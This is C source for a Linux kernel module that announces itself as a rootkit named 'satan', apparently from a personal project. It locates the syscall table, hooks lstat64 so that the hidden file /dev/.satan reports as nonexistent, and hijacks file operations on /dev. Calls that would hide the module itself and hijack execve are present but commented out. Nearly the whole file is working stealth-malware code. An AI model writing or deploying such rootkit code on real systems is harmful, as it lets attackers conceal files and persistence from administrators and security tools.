// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/uaccess.h>

#include "dev.h"
#include "file.h"
#include "hide.h"
#include "syscall.h"

#define SECRET_FILE "/dev/.satan"

asmlinkage int (*real_lstat64)(const char __user *filename,
                               struct stat64 __user *statbuf);

asmlinkage long satan_lstat64(const char __user *filename,
                              struct stat64 __user *statbuf)
{
        char buf[256] = {0};
        strncpy_from_user(buf, filename, 256);

        pr_info("satan: hijacked lstat64(%s, ...)\n", buf);

        if (!strncmp(buf, SECRET_FILE, strlen(SECRET_FILE))) {
                return -ENOENT;
        }

        real_lstat64 = (void *) satan_syscall_original_get(__NR_lstat64);
        return real_lstat64(filename, statbuf);
}


static int __init satan_init(void)
{
        pr_info("satan: initializing rootkit...\n");
        satan_dev_init(THIS_MODULE);
        satan_hijack_f_op("/dev");
        satan_syscall_find_table();
        satan_syscall_hook(__NR_lstat64, satan_lstat64);
        //satan_hijack_execve();
        //satan_set_hidden(true);
        return 0;
}

static void __exit satan_exit(void)
{
        pr_info("satan: shutting down...\n");
        satan_syscall_unhook(__NR_lstat64);
        satan_dev_destroy();
        satan_unhijack_f_op("/dev");
        //satan_set_hidden(false);
        //satan_restore_execve();
}

module_init(satan_init);
module_exit(satan_exit);

MODULE_LICENSE("GPL v2");
MODULE_VERSION("0.01");
